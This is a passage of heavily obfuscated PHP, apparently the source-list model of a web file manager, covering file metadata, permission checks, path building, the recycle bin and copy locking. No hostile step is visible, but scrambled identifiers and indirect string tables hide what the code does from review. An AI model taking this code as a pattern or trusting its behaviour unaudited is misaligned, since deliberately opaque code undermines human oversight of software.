array($Ö€ïñ”ë[456], $½Ä—Ï¹×)); $ÓğèÀ‡ = $Ö€ïñ”ë[508]; $à‘ïºÅ  = Model($Ö€ïñ”ë[509])->field($ÓğèÀ‡)->where($¤÷£å¦Ö)->select(); $à‘ïºÅ  = array_to_keyvalue($à‘ïºÅ , $Ö€ïñ”ë[506]); $ÌòÏ’ä‡ = Model($Ö€ïñ”ë[510])->field($Ö€ïñ”ë[511])->where($¤÷£å¦Ö)->select(); $ÌòÏ’ä‡ = $ÌòÏ’ä‡ ? $ÌòÏ’ä‡ : array(); $¼÷Ô¢¦ø = array(); foreach ($ÌòÏ’ä‡ as $‡÷åıÔ´) { if (!isset($¼÷Ô¢¦ø[$‡÷åıÔ´[$Ö€ïñ”ë[506]]])) { $¼÷Ô¢¦ø[$‡÷åıÔ´[$Ö€ïñ”ë[506]]] = array(); } $¼÷Ô¢¦ø[$‡÷åıÔ´[$Ö€ïñ”ë[506]]][$‡÷åıÔ´[$Ö€ïñ”ë[104]]] = $‡÷åıÔ´[$Ö€ïñ”ë[412]]; } foreach ($ß¼èÔĞÁ as &$îËÑëª£) { $™´‰è‰† = $îËÑëª£[$Ö€ïñ”ë[506]]; if (!$™´‰è‰† || !is_array($à‘ïºÅ [$™´‰è‰†])) { continue; } $Ó÷­úğú = $à‘ïºÅ [$™´‰è‰†]; $Ó÷­úğú[$Ö€ïñ”ë[86]] = $îËÑëª£[$Ö€ïñ”ë[86]]; $Ó÷­úğú[$Ö€ïñ”ë[42]] = $îËÑëª£[$Ö€ïñ”ë[42]]; if (!isset(self::$cacheFileInfo[$Ö€ïñ”ë[512] . $™´‰è‰†])) { self::$cacheFileInfo[$Ö€ïñ”ë[512] . $™´‰è‰†] = array_merge(array(), $Ó÷­úğú); } unset($à‘ïºÅ [$™´‰è‰†][$Ö€ïñ”ë[94]]); $ãÆã»™… = is_array($¼÷Ô¢¦ø[$™´‰è‰†]) ? $¼÷Ô¢¦ø[$™´‰è‰†] : array(); $îËÑëª£[$Ö€ïñ”ë[180]] = array_merge($ãÆã»™…, $à‘ïºÅ [$™´‰è‰†]); if (isset($îËÑëª£[$Ö€ïñ”ë[180]][$Ö€ïñ”ë[179]])) { $îËÑëª£[$Ö€ïñ”ë[179]] = json_decode($îËÑëª£[$Ö€ïñ”ë[180]][$Ö€ïñ”ë[179]], !0); unset($îËÑëª£[$Ö€ïñ”ë[180]][$Ö€ïñ”ë[179]]); } } unset($îËÑëª£); } protected function _listAppendSourceInfo(&$Ã¦‡Ø´Ç, $ƒÉèÍ°Ş) { $ù…¿Œàš =& $_SERVER[ªÏ§Ë·]; $õâìÉã× = Model($ù…¿Œàš[513])->listData(); $®à€Ù¦Û = Model($ù…¿Œàš[463])->listData(); $×ÂÏàªÛ = Model($ù…¿Œàš[453])->listData(); $§´Âöœ = Model($ù…¿Œàš[514])->listSimple(); $³ÏíŠø = array_to_keyvalue($õâìÉã×, $ù…¿Œàš[437]); $ûñ¿¤¬ = array_to_keyvalue_group($®à€Ù¦Û, $ù…¿Œàš[94], $ù…¿Œàš[464]); $·Êïà±ç = array_to_keyvalue($×ÂÏàªÛ, $ù…¿Œàš[94]); $Ô¶è×¬ = array_to_keyvalue_group($§´Âöœ, $ù…¿Œàš[440]); foreach ($Ã¦‡Ø´Ç as &$Ñø…Šû) { $Ñø…Šû[$ù…¿Œàš[97]] = array($ù…¿Œàš[515] => 0, $ù…¿Œàš[516] => 0, $ù…¿Œàš[517] => 0); if (isset($·Êïà±ç[$Ñø…Šû[$ù…¿Œàš[440]]])) { $Ñø…Šû[$ù…¿Œàš[97]][$ù…¿Œàš[518]] = 1; $Ñø…Šû[$ù…¿Œàš[97]][$ù…¿Œàš[519]] = $·Êïà±ç[$Ñø…Šû[$ù…¿Œàš[440]]][$ù…¿Œàš[42]]; } if ($ûñ¿¤¬ && $³ÏíŠø && isset($ûñ¿¤¬[$Ñø…Šû[$ù…¿Œàš[440]]])) { $Ñø…Šû[$ù…¿Œàš[97]][$ù…¿Œàš[520]] = array(); foreach ($ûñ¿¤¬[$Ñø…Šû[$ù…¿Œàš[440]]] as $ªßîÁˆ¦) { $ÄÅ…áÔ = $³ÏíŠø[$ªßîÁˆ¦]; $Ñø…Šû[$ù…¿Œàš[97]][$ù…¿Œàš[520]][] = array($ù…¿Œàš[521] => $ÄÅ…áÔ[$ù…¿Œàš[437]], $ù…¿Œàš[458] => $ÄÅ…áÔ[$ù…¿Œàš[42]], $ù…¿Œàš[522] => $ÄÅ…áÔ[$ù…¿Œàš[523]]); } } if ($Ô¶è×¬ && isset($Ô¶è×¬[$Ñø…Šû[$ù…¿Œàš[440]]])) { $Ñø…Šû[$ù…¿Œàš[97]][$ù…¿Œàš[524]] = array(); foreach ($Ô¶è×¬[$Ñø…Šû[$ù…¿Œàš[440]]] as $¸ÛÄó§) { $ØğÃÁ½ï = $ù…¿Œàš[525]; if ($¸ÛÄó§[$ù…¿Œàš[526]] == $ù…¿Œàš[98]) { $ØğÃÁ½ï .= $ù…¿Œàš[527]; } $Ñø…Šû[$ù…¿Œàš[97]][$ù…¿Œàš[524]] = array_field_key($¸ÛÄó§, explode($ù…¿Œàš[60], $ØğÃÁ½ï)); } } } unset($Ñø…Šû); return $Ã¦‡Ø´Ç; } protected function _listAppendChildren(&$ç´Çúã°, $…ŒşÔ“) { $áíèÆ‘å =& $_SERVER[ªÏ§Ë·]; $˜©ÌœÁ€ = array(); $Ç©‚‚–® = array($áíèÆ‘å[217] => 0, $áíèÆ‘å[218] => 0); foreach ($ç´Çúã° as &$€Ü£şİ«) { if (!$€Ü£şİ«[$áíèÆ‘å[448]]) { continue; } $˜©ÌœÁ€[] = $€Ü£şİ«[$áíèÆ‘å[440]]; } unset($€Ü£şİ«); if (!$˜©ÌœÁ€) { return; } $ë‡ëñìÆ = array($áíèÆ‘å[470] => array($áíèÆ‘å[7], $˜©ÌœÁ€), $áíèÆ‘å[469] => 0); $ÂÃœ†·¸ = array($áíèÆ‘å[470], $áíèÆ‘å[448], $áíèÆ‘å[528] => $áíèÆ‘å[529]); $Á«ñù» = $this->field($ÂÃœ†·¸)->where($ë‡ëñìÆ)->group($áíèÆ‘å[530])->select(); $æİùß = array(); foreach ($Á«ñù» as $ÛÓ¯¦¡‹) { $ØáºİÅª = $ÛÓ¯¦¡‹[$áíèÆ‘å[470]]; $­ø«Ö¤ç = $ÛÓ¯¦¡‹[$áíèÆ‘å[448]] == $áíèÆ‘å[98] ? $áíèÆ‘å[218] : $áíèÆ‘å[217]; if (!isset($æİùß[$ØáºİÅª])) { $æİùß[$ØáºİÅª] = array($áíèÆ‘å[217] => 0, $áíèÆ‘å[218] => 0); } $æİùß[$ØáºİÅª][$­ø«Ö¤ç] += $ÛÓ¯¦¡‹[$áíèÆ‘å[529]]; } foreach ($ç´Çúã° as &$€Ü£şİ«) { if (!$€Ü£şİ«[$áíèÆ‘å[448]]) { continue; } $ÓØÃ°óº = is_array($æİùß[$€Ü£şİ«[$áíèÆ‘å[440]]]) ? $æİùß[$€Ü£şİ«[$áíèÆ‘å[440]]] : $Ç©‚‚–®; $€Ü£şİ«[$áíèÆ‘å[218]] = $ÓØÃ°óº[$áíèÆ‘å[218]]; $€Ü£şİ«[$áíèÆ‘å[217]] = $ÓØÃ°óº[$áíèÆ‘å[217]]; unset($€Ü£şİ«[$áíèÆ‘å[450]]); } unset($€Ü£şİ«); } protected function _listAppendAuth(&$äÌü©Œƒ) { $ğá¤¼‘û =& $_SERVER[ªÏ§Ë·]; $·–Ì®‹Å = array(); foreach ($äÌü©Œƒ as $ºƒÒÂŸ) { if ($ºƒÒÂŸ[$ğá¤¼‘û[449]] == self::TYPE_GROUP) { $·–Ì®‹Å[] = $ºƒÒÂŸ[$ğá¤¼‘û[440]]; } } if (!$·–Ì®‹Å) { return; } $Øş¨¤¾£ = array_to_keyvalue($äÌü©Œƒ, $ğá¤¼‘û[440]); $—Åúğä’ = Model($ğá¤¼‘û[531])->getSourceList($·–Ì®‹Å, $Øş¨¤¾£); $Ì¢øƒÃ = $GLOBALS[$ğá¤¼‘û[532]] == 1; foreach ($äÌü©Œƒ as $ğÒ÷²ÊÊ => &$ºƒÒÂŸ) { $ºƒÒÂŸ[$ğá¤¼‘û[451]] = $—Åúğä’[$ºƒÒÂŸ[$ğá¤¼‘û[440]]]; if (!$ºƒÒÂŸ[$ğá¤¼‘û[451]] && $ºƒÒÂŸ[$ğá¤¼‘û[449]] == self::TYPE_GROUP) { $ºƒÒÂŸ[$ğá¤¼‘û[451]] = Action($ğá¤¼‘û[533])->pathGroupAuthMake($ºƒÒÂŸ[$ğá¤¼‘û[534]]); if (!$ºƒÒÂŸ[$ğá¤¼‘û[451]] && !$Ì¢øƒÃ) { $ºƒÒÂŸ[$ğá¤¼‘û[213]] = !1; $ºƒÒÂŸ[$ğá¤¼‘û[212]] = !1; } } if ($ºƒÒÂŸ[$ğá¤¼‘û[451]]) { $ºƒÒÂŸ[$ğá¤¼‘û[213]] = AuthModel::authCheckEdit($ºƒÒÂŸ[$ğá¤¼‘û[451]][$ğá¤¼‘û[452]]); $ºƒÒÂŸ[$ğá¤¼‘û[212]] = AuthModel::authCheckView($ºƒÒÂŸ[$ğá¤¼‘û[451]][$ğá¤¼‘û[452]]); } $this->groupPathDisplay($ºƒÒÂŸ); } unset($ºƒÒÂŸ); } public function _listAppendAuthSecret(&$…™£òŒ) { $¥ü²Ì¢ =& $_SERVER[ªÏ§Ë·]; if (Model($¥ü²Ì¢[473])->get($¥ü²Ì¢[535]) != $¥ü²Ì¢[98]) { return; } static $ÜºµïÏ = false; if (!$ÜºµïÏ) { $“—Ôìı“ = Model($¥ü²Ì¢[536]); $ó£Ìäó = Model($¥ü²Ì¢[537]); $ÜºµïÏ = $ó£Ìäó->listData(); $ÜºµïÏ = array_to_keyvalue($ÜºµïÏ, $¥ü²Ì¢[440]); $İÌÚøÙì = json_decode(Model($¥ü²Ì¢[473])->get($¥ü²Ì¢[538]), !0); $İÌÚøÙì = array_to_keyvalue($İÌÚøÙì, $¥ü²Ì¢[437]); foreach ($ÜºµïÏ as $ªşã·ê => $ÒØÚƒúì) { $£ °ˆòå = $İÌÚøÙì[$ÒØÚƒúì[$¥ü²Ì¢[539]]]; if (!$£ °ˆòå) { $ó£Ìäó->remove($ÒØÚƒúì[$¥ü²Ì¢[437]]); unset($ÜºµïÏ[$ªşã·ê]); continue; } $Èë™É» = $“—Ôìı“->listData($£ °ˆòå[$¥ü²Ì¢[451]]); if (!$Èë™É») { $ó£Ìäó->remove($ÒØÚƒúì[$¥ü²Ì¢[437]]); unset($ÜºµïÏ[$ªşã·ê]); continue; } $ÒØÚƒúì[$¥ü²Ì¢[451]] = $Èë™É»; $ÒØÚƒúì[$¥ü²Ì¢[540]] = $£ °ˆòå; $ÒØÚƒúì[$¥ü²Ì¢[541]] = Model($¥ü²Ì¢[542])->getInfoSimpleOuter($ÒØÚƒúì[$¥ü²Ì¢[492]]); $ÜºµïÏ[$ªşã·ê] = $ÒØÚƒúì; } } $—÷ë—œ = USER_ID; $½§ŞÅ°û = array(); $¿º„§® = $this->_listAppendPath($½§ŞÅ°û, !0); foreach ($…™£òŒ as $ªşã·ê => &$ÒØÚƒúì) { if (!is_array($ÒØÚƒúì[$¥ü²Ì¢[451]])) { continue; } if ($ÒØÚƒúì[$¥ü²Ì¢[449]] != $¥ü²Ì¢[543]) { continue; } if (isset($ÜºµïÏ[$ÒØÚƒúì[$¥ü²Ì¢[440]]])) { $Ìï®ç¶• = $ÜºµïÏ[$ÒØÚƒúì[$¥ü²Ì¢[440]]]; if (!is_array($ÒØÚƒúì[$¥ü²Ì¢[504]])) { $ÒØÚƒúì[$¥ü²Ì¢[504]] = array(); } $ÒØÚƒúì[$¥ü²Ì¢[504]][$¥ü²Ì¢[544]] = $Ìï®ç¶•[$¥ü²Ì¢[539]]; $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[545]] = $Ìï®ç¶•; $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[546]] = $ÒØÚƒúì[$¥ü²Ì¢[547]]; $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[548]] = $¥ü²Ì¢[98]; if ($Ìï®ç¶•[$¥ü²Ì¢[492]] != $—÷ë—œ) { $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[452]] = $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[452]] & $Ìï®ç¶•[$¥ü²Ì¢[451]][$¥ü²Ì¢[451]]; } continue; } $§Œï¤œ = $this->parentLevelArray($ÒØÚƒúì[$¥ü²Ì¢[549]]); $¬òÜ…£ = array_reverse($§Œï¤œ); foreach ($¬òÜ…£ as $ÄåÖ½Õ => $ÏŠ’Åéú) { if (!isset($ÜºµïÏ[$ÏŠ’Åéú])) { continue; } $Ìï®ç¶• = $ÜºµïÏ[$ÏŠ’Åéú]; $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[545]] = $Ìï®ç¶•; if ($Ìï®ç¶•[$¥ü²Ì¢[492]] != $—÷ë—œ) { $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[452]] = $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[452]] & $Ìï®ç¶•[$¥ü²Ì¢[451]][$¥ü²Ì¢[451]]; } $ùì™ € = $¥ü²Ì¢[12]; $úîäÕÕÓ = count($§Œï¤œ) - $ÄåÖ½Õ; for ($ƒ‡ùÎâè = 0; $ƒ‡ùÎâè < $úîäÕÕÓ; $ƒ‡ùÎâè++) { if (!isset($¿º„§®[$§Œï¤œ[$ƒ‡ùÎâè]])) { $ùì™ € = $¥ü²Ì¢[12]; break; } $ùì™ € = $ùì™ € . rtrim($¿º„§®[$§Œï¤œ[$ƒ‡ùÎâè]], $¥ü²Ì¢[8]) . $¥ü²Ì¢[8]; } $ÒØÚƒúì[$¥ü²Ì¢[451]][$¥ü²Ì¢[546]] = rtrim($ùì™ €, $¥ü²Ì¢[8]) . $¥ü²Ì¢[8]; break; } } unset($ÒØÚƒúì); } public function groupPathDisplay(&$ş˜ èõü) { $‘º˜§ªö =& $_SERVER[ªÏ§Ë·]; if ($ş˜ èõü[$‘º˜§ªö[449]] != self::TYPE_GROUP) { return; } $ç¢˜Ûô = Model($‘º˜§ªö[550])->getInfo($ş˜ èõü[$‘º˜§ªö[534]]); $ıÌ¤“î = $this->parentLevelArray($ç¢˜Ûô[$‘º˜§ªö[549]]); $şÉŒ¢ˆù = $‘º˜§ªö[12]; foreach ($ıÌ¤“î as $ûÌË¼ÖË) { $ÃµØß¦Ë = Model($‘º˜§ªö[550])->getInfo($ûÌË¼ÖË); $şÉŒ¢ˆù .= $ÃµØß¦Ë[$‘º˜§ªö[97]][$‘º˜§ªö[440]] . $‘º˜§ªö[60]; } $ş˜ èõü[$‘º˜§ªö[551]] = $ç¢˜Ûô[$‘º˜§ªö[470]]; $ş˜ èõü[$‘º˜§ªö[552]] = $ç¢˜Ûô[$‘º˜§ªö[549]]; $ş˜ èõü[$‘º˜§ªö[553]] = $ç¢˜Ûô[$‘º˜§ªö[554]]; $ş˜ èõü[$‘º˜§ªö[555]] = $şÉŒ¢ˆù . $ç¢˜Ûô[$‘º˜§ªö[97]][$‘º˜§ªö[440]]; } protected function _listAppendPath(&$ìßË¤Ö, $òãâÙ¬ = false) { $Â’’‚ºÄ =& $_SERVER[ªÏ§Ë·]; static $ÂÌ¤ùí§ = array(); $ÓÉş”Ô¸ = array(); $¯‘­© = array(); if ($òãâÙ¬) { return $ÂÌ¤ùí§; } foreach ($ìßË¤Ö as &$›Çáë¦ë) { $‡êµ¿Û¡ = $›Çáë¦ë[$Â’’‚ºÄ[440]]; if ($›Çáë¦ë[$Â’’‚ºÄ[448]] == $Â’’‚ºÄ[98] && $›Çáë¦ë[$Â’’‚ºÄ[470]] != 0) { $ÂÌ¤ùí§[$‡êµ¿Û¡] = $›Çáë¦ë[$Â’’‚ºÄ[42]]; } if ($›Çáë¦ë[$Â’’‚ºÄ[448]] == $Â’’‚ºÄ[98] && $›Çáë¦ë[$Â’’‚ºÄ[470]] == 0 && !isset($ÂÌ¤ùí§[$‡êµ¿Û¡])) { $ÂÌ¤ùí§[$‡êµ¿Û¡] = $this->_listAppendPathRoot($›Çáë¦ë, array()); } if (isset($¯‘­©[$›Çáë¦ë[$Â’’‚ºÄ[549]]])) { continue; } $¯‘­©[$›Çáë¦ë[$Â’’‚ºÄ[549]]] = !0; $±ñªÅÜ˜ = $this->parentLevelArray($›Çáë¦ë[$Â’’‚ºÄ[549]]); foreach ($±ñªÅÜ˜ as $ûúŒ¬ø® => $†ˆïÆÁà) { if (isset($ÂÌ¤ùí§[$†ˆïÆÁà])) { continue; } if ($ûúŒ¬ø® == 0) { $ÂÌ¤ùí§[$†ˆïÆÁà] = $this->_listAppendPathRoot($›Çáë¦ë, $±ñªÅÜ˜); } if ($ûúŒ¬ø® != 0) { $ÓÉş”Ô¸[] = $†ˆïÆÁà; } } } unset($›Çáë¦ë); $ÓÉş”Ô¸ = array_unique($ÓÉş”Ô¸); if (count($ÓÉş”Ô¸) > 0) { $„­šÓ¿ = array($Â’’‚ºÄ[455] => array($Â’’‚ºÄ[456], $ÓÉş”Ô¸)); if (count($ÓÉş”Ô¸) == 1) { $îÎÀéÇÙ = $this->sourceInfo($ÓÉş”Ô¸[0]); $õäÖ„µ = is_array($îÎÀéÇÙ) ? array($îÎÀéÇÙ) : !1; } else { $õäÖ„µ = $this->field($Â’’‚ºÄ[556])->where($„­šÓ¿)->select(); } if (!$õäÖ„µ) { $õäÖ„µ = array(); } foreach ($õäÖ„µ as $Åéµ¨Äó) { $ÂÌ¤ùí§[$Åéµ¨Äó[$Â’’‚ºÄ[440]]] = $Åéµ¨Äó[$Â’’‚ºÄ[42]]; } } $ÇñŠø¬Ù = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÉåîÂø¢ = array(); foreach ($ìßË¤Ö as &$›Çáë¦ë) { $öİ—Í²ù = $›Çáë¦ë[$Â’’‚ºÄ[549]]; $‚ò›ù“ß = $Â’’‚ºÄ[12]; if (isset($ÉåîÂø¢[$öİ—Í²ù])) { $‚ò›ù“ß = $ÉåîÂø¢[$öİ—Í²ù]; } else { $±ñªÅÜ˜ = $this->parentLevelArray($›Çáë¦ë[$Â’’‚ºÄ[549]]); foreach ($±ñªÅÜ˜ as $ûúŒ¬ø® => $†ˆïÆÁà) { if (isset($ÂÌ¤ùí§[$†ˆïÆÁà])) { $‚ò›ù“ß .= $ÂÌ¤ùí§[$†ˆïÆÁà] . $Â’’‚ºÄ[8]; } } $ÉåîÂø¢[$öİ—Í²ù] = $‚ò›ù“ß; } $‚ò›ù“ß .= $›Çáë¦ë[$Â’’‚ºÄ[42]]; if ($›Çáë¦ë[$Â’’‚ºÄ[448]] == $Â’’‚ºÄ[98]) { $‚ò›ù“ß .= $Â’’‚ºÄ[8]; } $›Çáë¦ë[$Â’’‚ºÄ[547]] = str_replace($Â’’‚ºÄ[557], $Â’’‚ºÄ[8], $‚ò›ù“ß); if ($›Çáë¦ë[$Â’’‚ºÄ[470]] == $Â’’‚ºÄ[208]) { $›Çáë¦ë[$Â’’‚ºÄ[42]] = trim($ÂÌ¤ùí§[$›Çáë¦ë[$Â’’‚ºÄ[440]]], $Â’’‚ºÄ[8]); $›Çáë¦ë[$Â’’‚ºÄ[547]] = $›Çáë¦ë[$Â’’‚ºÄ[42]] . $Â’’‚ºÄ[8]; } if (intval($›Çáë¦ë[$Â’’‚ºÄ[449]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($›Çáë¦ë, $±ñªÅÜ˜, $ÇñŠø¬Ù); } } unset($›Çáë¦ë); return $ìßË¤Ö; } private function _listAppendPathRecycle(&$Ò½øŸÖÒ, $·ñÅÎøë, $øËıË¿”) { $•ôÎñÇÑ =& $_SERVER[ªÏ§Ë·]; if (!in_array($øËıË¿”, $·ñÅÎøë) && $Ò½øŸÖÒ[$•ôÎñÇÑ[440]] != $øËıË¿”) { return; } $ù¸Î«’¦ = explode($•ôÎñÇÑ[8], trim($Ò½øŸÖÒ[$•ôÎñÇÑ[547]], $•ôÎñÇÑ[8])); $¬³„‹Ë™ = implode($•ôÎñÇÑ[8], array_slice($ù¸Î«’¦, 2)); $Ò½øŸÖÒ[$•ôÎñÇÑ[547]] = $•ôÎñÇÑ[8] . LNG($•ôÎñÇÑ[558]) . $•ôÎñÇÑ[8] . ltrim($¬³„‹Ë™, $•ôÎñÇÑ[8]); $Ò½øŸÖÒ[$•ôÎñÇÑ[549]] = $•ôÎñÇÑ[559] . implode($•ôÎñÇÑ[60], array_slice($·ñÅÎøë, 1)) . $•ôÎñÇÑ[60]; if ($Ò½øŸÖÒ[$•ôÎñÇÑ[440]] == $øËıË¿”) { $Ò½øŸÖÒ[$•ôÎñÇÑ[549]] = $•ôÎñÇÑ[559]; $Ò½øŸÖÒ[$•ôÎñÇÑ[470]] = $•ôÎñÇÑ[208]; $Ò½øŸÖÒ[$•ôÎñÇÑ[42]] = LNG($•ôÎñÇÑ[558]); } $Ò½øŸÖÒ[$•ôÎñÇÑ[560]] = $•ôÎñÇÑ[561]; } protected function _listAppendPathRoot(&$Ş¥Å¿×î, $½Š”™ñÎ) { $»ªá Î =& $_SERVER[ªÏ§Ë·]; static $±ËóÖ‡° = false; $“‡š‘½ = $»ªá Î[12]; if ($Ş¥Å¿×î[$»ªá Î[449]] == self::TYPE_USER) { if ($Ş¥Å¿×î[$»ªá Î[534]] == USER_ID) { $“‡š‘½ = LNG($»ªá Î[562]); if ($±ËóÖ‡° === !1) { $µ‘…² = Model($»ªá Î[563])->getInfoFull(USER_ID); $±ËóÖ‡° = _get($µ‘…², $»ªá Î[564], $»ªá Î[12]); } if ($½Š”™ñÎ && $½Š”™ñÎ[0] == $±ËóÖ‡° || !$½Š”™ñÎ && $Ş¥Å¿×î[$»ªá Î[440]] == $±ËóÖ‡°) { $“‡š‘½ = LNG($»ªá Î[565]); $Ş¥Å¿×î[$»ªá Î[566]] = $»ªá Î[567]; } if (!$½Š”™ñÎ) { $Ş¥Å¿×î[$»ªá Î[42]] = $“‡š‘½; } } else { $™åúàí± = Model($»ªá Î[542])->getInfoSimple($Ş¥Å¿×î[$»ªá Î[534]]); $“‡š‘½ = LNG($»ªá Î[568]) . $»ªá Î[172] . $™åúàí±[$»ªá Î[42]] . $»ªá Î[174]; $Ş¥Å¿×î[$»ªá Î[569]] = array($»ªá Î[42] => $™åúàí±[$»ªá Î[42]], $»ªá Î[570] => $™åúàí±[$»ªá Î[570]], $»ªá Î[571] => $™åúàí±[$»ªá Î[571]]); } } else { if ($Ş¥Å¿×î[$»ªá Î[449]] == self::TYPE_GROUP) { $™åúàí± = Model($»ªá Î[550])->getInfoSimple($Ş¥Å¿×î[$»ªá Î[534]]); $“‡š‘½ = $™åúàí±[$»ªá Î[42]]; } else { if ($Ş¥Å¿×î[$»ªá Î[449]] == self::TYPE_SYSTEM) { $“‡š‘½ = $»ªá Î[572]; } } } $“‡š‘½ = $“‡š‘½ ? $»ªá Î[8] . $“‡š‘½ . $»ªá Î[8] : $»ªá Î[8]; return $“‡š‘½; } protected function _listAppendUser(&$œ¡âÔŞƒ) { $òÆƒØê =& $_SERVER[ªÏ§Ë·]; $…¡Ì¯ı® = array_to_keyvalue($œ¡âÔŞƒ, $òÆƒØê[12], $òÆƒØê[492]); $Éëè ø = array_to_keyvalue($œ¡âÔŞƒ, $òÆƒØê[12], $òÆƒØê[494]); $ĞÏÂúõ = array_merge($…¡Ì¯ı®, $Éëè ø); $•¯µÈÊ§ = Model($òÆƒØê[563])->userListInfo($ĞÏÂúõ); foreach ($œ¡âÔŞƒ as &$¾®²ºö) { $­»ƒÃ· = $¾®²ºö[$òÆƒØê[492]]; $¾®²ºö[$òÆƒØê[492]] = $•¯µÈÊ§[$­»ƒÃ·] ? $•¯µÈÊ§[$­»ƒÃ·] : !1; $­»ƒÃ· = $¾®²ºö[$òÆƒØê[494]]; $¾®²ºö[$òÆƒØê[494]] = $•¯µÈÊ§[$­»ƒÃ·] ? $•¯µÈÊ§[$­»ƒÃ·] : !1; if (isset($¾®²ºö[$òÆƒØê[504]]) && $¾®²ºö[$òÆƒØê[504]][$òÆƒØê[573]]) { $ö™®°õ— = $GLOBALS[$òÆƒØê[6]][$òÆƒØê[99]][$òÆƒØê[574]]; if ($¾®²ºö[$òÆƒØê[504]][$òÆƒØê[575]] <= time() - $ö™®°õ—) { $this->metaSet($¾®²ºö[$òÆƒØê[440]], $òÆƒØê[573], null); $this->metaSet($¾®²ºö[$òÆƒØê[440]], $òÆƒØê[575], null); unset($¾®²ºö[$òÆƒØê[504]][$òÆƒØê[573]]); continue; } $„×ç­» = $¾®²ºö[$òÆƒØê[504]][$òÆƒØê[573]]; $¾®²ºö[$òÆƒØê[504]][$òÆƒØê[576]] = Model($òÆƒØê[563])->getInfoSimpleOuter($„×ç­»); } } unset($¾®²ºö); } public function parentLevelArray($ë¼»Áö¸) { $µƒø±Ñ¤ =& $_SERVER[ªÏ§Ë·]; $ë¼»Áö¸ = explode($µƒø±Ñ¤[60], trim($ë¼»Áö¸, $µƒø±Ñ¤[60])); return array_remove_value($ë¼»Áö¸, $µƒø±Ñ¤[208]); } public function listAll($–Ûš‡ ) { $¤¸‰±ÓÓ =& $_SERVER[ªÏ§Ë·]; $èº­°èö = $this->sourceInfo($–Ûš‡ ); $Ù­¯ôÌí = array($¤¸‰±ÓÓ[577] => array($¤¸‰±ÓÓ[578], $èº­°èö[$¤¸‰±ÓÓ[549]] . $–Ûš‡  . $¤¸‰±ÓÓ[579]), $¤¸‰±ÓÓ[580] => 0); $“œòşö = $¤¸‰±ÓÓ[581]; $µ†öˆºı = "\114\x45\106\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\151\157\137\x66\151\154\x65\x20\146\x69\154\145\40\x6f\156\x20\x73\x6f\x75\x72\x63\145\56\x66\151\154\145\111\104\x20\75\x20\146\x69\154\145\56\146\x69\154\x65\x49\104"; $ñâÏàÎõ = $this->alias($¤¸‰±ÓÓ[484])->field($“œòşö)->where($Ù­¯ôÌí)->join($µ†öˆºı)->select(); $this->_listAppendAuth($ñâÏàÎõ); $this->_listAppendUser($ñâÏàÎõ); $this->_listAppendPath($ñâÏàÎõ); $ñâÏàÎõ = array_to_keyvalue($ñâÏàÎõ, $¤¸‰±ÓÓ[440]); $ôèşÙ½ = "\57{$èº­°èö[$¤¸‰±ÓÓ[42]]}\x2f"; $ôèşÙ½ = $ôèşÙ½ == $¤¸‰±ÓÓ[557] ? $¤¸‰±ÓÓ[8] : $ôèşÙ½; $û²»Á€Â = array(); foreach ($ñâÏàÎõ as $Õ¯‚‰  => $ùâÁ›Ò„) { $‹øŠêÀ‘ = $this->parentLevelArray($ùâÁ›Ò„[$¤¸‰±ÓÓ[549]]); array_shift($‹øŠêÀ‘); $ºä§£ç£ = $ôèşÙ½; for ($ˆ‡–ùŞ = 0; $ˆ‡–ùŞ < count($‹øŠêÀ‘); $ˆ‡–ùŞ++) { $ºä§£ç£ .= $ñâÏàÎõ[$‹øŠêÀ‘[$ˆ‡–ùŞ]][$¤¸‰±ÓÓ[42]] . $¤¸‰±ÓÓ[8]; } $ºä§£ç£ .= $ùâÁ›Ò„[$¤¸‰±ÓÓ[42]]; if ($ùâÁ›Ò„[$¤¸‰±ÓÓ[448]]) { $ºä§£ç£ .= $¤¸‰±ÓÓ[8]; } $œ÷¼Œ¼Ë = array($¤¸‰±ÓÓ[459] => str_replace($¤¸‰±ÓÓ[557], $¤¸‰±ÓÓ[8], str_replace($¤¸‰±ÓÓ[557], $¤¸‰±ÓÓ[8], str_replace($¤¸‰±ÓÓ[557], $¤¸‰±ÓÓ[8], $ºä§£ç£))), $¤¸‰±ÓÓ[582] => intval($ùâÁ›Ò„[$¤¸‰±ÓÓ[448]]), $¤¸‰±ÓÓ[583] => intval($ùâÁ›Ò„[$¤¸‰±ÓÓ[86]]), $¤¸‰±ÓÓ[95] => intval($ùâÁ›Ò„[$¤¸‰±ÓÓ[95]]), $¤¸‰±ÓÓ[97] => $this->pathInfoFilter($ùâÁ›Ò„)); if (!$œ÷¼Œ¼Ë[$¤¸‰±ÓÓ[448]]) { $œ÷¼Œ¼Ë[$¤¸‰±ÓÓ[506]] = $ùâÁ›Ò„[$¤¸‰±ÓÓ[506]]; } $û²»Á€Â[] = $œ÷¼Œ¼Ë; } $û²»Á€Â = array_sort_by($û²»Á€Â, $¤¸‰±ÓÓ[94]); return $û²»Á€Â; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($î©û×§û) { $Ö­ÙÜ§¤ =& $_SERVER[ªÏ§Ë·]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ö­ÙÜ§¤[584], $î©û×§û); $ØÒ‹Â–Š = 1; $this->_lockEvent($î©û×§û, array($Ö­ÙÜ§¤[585], $Ö­ÙÜ§¤[586]), $ØÒ‹Â–Š); $this->_lockParent($î©û×§û, array($Ö­ÙÜ§¤[586]), $ØÒ‹Â–Š); $this->_lockEvent($î©û×§û, array($Ö­ÙÜ§¤[587], $Ö­ÙÜ§¤[588]), $ØÒ‹Â–Š); $this->_lockCheckEnd($Ö­ÙÜ§¤[584], $î©û×§û); } public function lockCopyEnd($È›¯¸ô‚) { $ş¸­ŒÚ½ =& $_SERVER[ªÏ§Ë·]; if (!$this->allowLock()) { return; } $ıõÔÊ°Ü = 0; 